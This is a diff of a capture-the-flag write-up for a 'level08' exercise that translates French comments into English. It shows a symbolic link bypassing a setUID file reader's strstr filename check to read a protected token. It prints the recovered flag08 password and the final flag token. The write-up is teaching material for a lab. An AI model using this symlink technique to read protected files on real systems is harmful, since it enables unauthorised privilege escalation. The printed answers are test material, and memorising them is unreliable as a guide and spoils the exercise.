@@ -1,10 +1,10 @@
-#On arrive sur le home et on a un fichier binaire et un fichier token dont les droits de lecture nous on ete retire
-#En lancant le binaire on s'apercoit que c'est un lecteur de fichier
+#On our home directory we have a binary and a "token" file which we are not allowed to read
+# As in the previous level, the binary is a setUID and after running it, it appears that's its a file reader
 
 ./level08 token
 >>> You may not access token
 
-#Ce message d'erreur est louche, allons voir de plus pres en utilisant ltrace
+# This error message is weird, lets look at ltrace
 
 ltrace ./level08 token
 >>>
@@ -15,8 +15,8 @@ printf("You may not access '%s'\n", "token"You may not access 'token'
 exit(1 <unfinished ...>
 +++ exited (status 1) +++
 
-#on voit qu'un strstr est utilise pour comparer le nom du fichier passer en entree
-#on cree donc un lien symbolique dans un dossier tmp qui pointe sur token
+#To prevent us from reading the token file with this setUID, an strstr check is made on the filename given as parameter
+#To bypass it, we just must create a symbolic link on our token file with anoter name
 
 mkdir tmp/azur
 cd /tmp/azur
@@ -26,12 +26,10 @@ cd ~
 ./level08 /tmp/azur/slt
 >>> quif5eloekouj29ke0vouxean
 
-#Et voila notre token. /!\ ATTENTION CECI N'EST PAS LE FLAG /!\
+#Here it is, we finally have the content of token but watch out : this is not the flag but the flag08 pass
 
 su flag08
 quif5eloekouj29ke0vouxean
-
-#On lance getflag
 
 getflag
 Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
